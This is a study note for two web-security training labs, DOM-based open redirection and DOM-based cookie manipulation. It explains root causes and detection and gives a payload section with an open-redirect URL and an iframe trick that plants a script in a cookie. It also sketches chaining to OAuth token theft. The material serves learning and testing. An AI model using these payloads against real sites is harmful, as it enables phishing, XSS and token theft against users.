# DOM-based vulnerabilities - Open redirection and cookie manipulation

**DOM-based open redirect:** JS reads a URL from `location.search` and writes it to `location.href` - attacker controls where the user goes next. **DOM-based cookie manipulation:** JS writes a URL fragment from `location.href` into a cookie value that is later rendered into the page - attacker-controlled product URL poisons the cookie, triggering XSS on the next home page load.

## Quick reference
```
# Open redirect (navigate victim to attacker-controlled URL)
/post?postId=4&url=https://EXPLOIT-SERVER/
# victim follows "Back to Blog" link -> JS reads url= -> location.href = EXPLOIT-SERVER

# Cookie manipulation XSS (2-step iframe)
# Step 1: victim visits product page with XSS payload in URL -> JS writes it to cookie
# Step 2: victim visits home page -> cookie value rendered into page -> XSS fires
<iframe src="https://LAB/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB/';window.x=1;">
# First load: poisoned URL -> cookie set.  Second load (redirect to /): cookie rendered -> XSS.
```

## Root cause
- **Open redirect:** JS extracts query parameter `url=` and assigns it to `location.href` with only a weak regex check (`/url=https?:\/\/.+/`). Attacker supplies any https URL.
- **Cookie manipulation:** JS sets `document.cookie = 'lastViewedProduct=' + window.location` when a product page is loaded. The cookie value (which includes the full URL with attacker-controlled query params) is later written into the page via innerHTML - stored XSS via cookie.

## Find it
**Open redirect:**
1. Click "Back to Blog" or any return-to link; intercept in Burp -> look for `url=` query param.
2. View page JS -> search for `location.href = ` or `location.assign` fed by `location.search`/`location.hash`.
3. Test: replace `url=` value with `https://example.com` -> if redirected -> DOM-based open redirect.

**Cookie manipulation:**
1. Browse product pages; check DevTools -> Application -> Cookies -> look for `lastViewedProduct` or similar URL-valued cookies.
2. View JS -> search for `document.cookie = ` assigned from `location.href` or similar.
3. Check home/dashboard page: does it read the cookie value and render it into innerHTML/document.write?

## Technique

**DOM-based open redirection:**
1. On blog post page, observe "Back to Blog" link JS: `location.href = /url=https?:\/\/.+/.exec(location)[1]`.
2. URL must start with https:// - any https URL works.
3. Construct: `https://LAB/post?postId=4&url=https://EXPLOIT-SERVER/`.
4. Send this URL to victim (social engineering / exploit server redirect). When victim clicks "Back to Blog" link, they're sent to exploit server.
5. Can be used for phishing, or chained with OAuth flows to steal access tokens.

**DOM-based cookie manipulation (XSS):**
1. Observe `lastViewedProduct` cookie set to product page URL when browsing.
2. Observe home page reads this cookie and renders product link into the page via innerHTML.
3. Craft malicious product URL: `?productId=1&'><script>print()</script>` - the `'>` breaks out of the href attribute, `<script>` runs.
4. Use iframe with 2-load trick:
   - Load 1: iframe opens product page with malicious URL -> cookie poisoned.
   - Load 2: `onload` redirects iframe to home page -> home page renders the poisoned cookie -> XSS.
5. `<iframe src="https://LAB/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://LAB/';window.x=1;">`

## Payload arsenal
```html
<!-- Open redirect: craft URL to use in victim's browser -->
https://LAB/post?postId=4&url=https://EXPLOIT-SERVER/

<!-- Cookie XSS: iframe with 2-load trick -->
<iframe src="https://LAB/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB/';window.x=1;">

<!-- Cookie XSS: URL-encoded version if needed -->
<iframe src="https://LAB/product?productId=1%26%27%3E%3Cscript%3Eprint()%3C%2Fscript%3E"
        onload="if(!window.x)this.src='https://LAB/';window.x=1;">
```

## Bypasses
| Defense | Bypass |
|---|---|
| Regex requires `https://` prefix | Provide any https:// URL - attacker domain qualifies |
| Cookie httpOnly | N/A here - this is DOM manipulation via cookie value, not reading the cookie |
| Cookie value sanitized on write | If sanitized on write but not on read (render), injection still works |

## Exploitation walkthrough
**Open redirect:** Visit `https://LAB/post?postId=4&url=https://EXPLOIT-SERVER/` in victim's browser -> JS reads `url=https://EXPLOIT-SERVER/` -> `location.href` set -> victim lands on exploit server.

**Cookie XSS:**
1. Craft iframe on exploit server with the 2-load trick.
2. Victim loads exploit page -> iframe loads product URL -> `lastViewedProduct` cookie = malicious URL.
3. Iframe onload fires (window.x=1 guard prevents loop) -> redirects to home page.
4. Home page renders cookie value into innerHTML -> `<script>print()</script>` executes.

## Chaining
- Open redirect -> OAuth token theft: if OAuth redirects via open redirect URL -> attacker gets `code` or `access_token` in their server logs.
- Cookie XSS -> persistent XSS (fires on every home page visit until cookie expires).
- DOM-based XSS -> [Exploiting-XSS](../../XSS/Exploiting-XSS/) for cookie theft, password capture, CSRF bypass.

## Tools
- **Burp Proxy** - intercept redirect/navigation requests to spot URL params
- **Browser DevTools > Application > Cookies** - observe cookie values in real-time
- **Exploit server** - host the iframe payload

## Labs

### DOM-based open redirection [Practitioner]
Blog post "Back to Blog" JS reads `url=` query param and sets `location.href`. Craft: `/post?postId=4&url=https://EXPLOIT-SERVER/`. Key insight: JS reads location.search without validating the destination domain - any https:// URL accepted.

### DOM-based cookie manipulation [Practitioner]
`lastViewedProduct` cookie = product page URL (set in JS). Home page renders cookie value into innerHTML. Iframe: first load poisons cookie with XSS URL (`&'><script>print()</script>`), second load triggers it on home page. Key insight: cookie is a DOM source AND a DOM sink - attacker controls it via URL.

## Real-world notes
- DOM-based open redirects are underrated as OAuth attack primitives - always check for them before chaining OAuth exploits.
- Cookie values rendered into page HTML are rare but devastating: the XSS persists across browser sessions until the cookie expires or is overwritten.

## References
- https://portswigger.net/web-security/dom-based/open-redirection
- https://portswigger.net/web-security/dom-based/cookie-manipulation
